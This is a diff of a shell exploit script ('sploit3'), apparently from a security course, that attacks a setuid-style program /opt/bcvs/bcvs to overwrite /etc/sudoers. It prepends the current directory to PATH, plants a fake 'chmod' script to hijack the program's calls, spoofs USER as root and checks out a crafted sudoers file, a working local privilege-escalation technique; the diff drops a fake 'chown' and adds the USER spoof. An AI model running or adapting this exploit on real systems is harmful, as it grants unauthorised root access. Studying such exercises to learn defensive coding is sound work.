@@ -11,6 +11,7 @@
 
 
 # Setup environment
+rm -rf sploit3_dir
 mkdir -p sploit3_dir
 cd sploit3_dir
 mkdir -p .bcvs
@@ -29,22 +30,18 @@ root ALL=(ALL:ALL) ALL
 #includedir /etc/sudoers.d
 END_OF_STR
 
-# Now setup dummy scripts to avoid the chmod and chown calls
+# Now setup dummy script to avoid the chmod
 # Could just nuke the path as well
 PATH=.:$PATH
-cat <<EOS > "chown"
-#!/bin/bash
-echo "I chowned you"
-EOS
-
 cat <<EOS > "chmod"
 #!/bin/bash
 echo "Who cares what permissions you have"
 EOS
 
 # Make sure they are executable or the OS will continue down the path
-chmod +x "./chown"
 chmod +x "./chmod"
+
+export USER="root"
 
 echo "gotcha" | /opt/bcvs/bcvs co sudoers
 
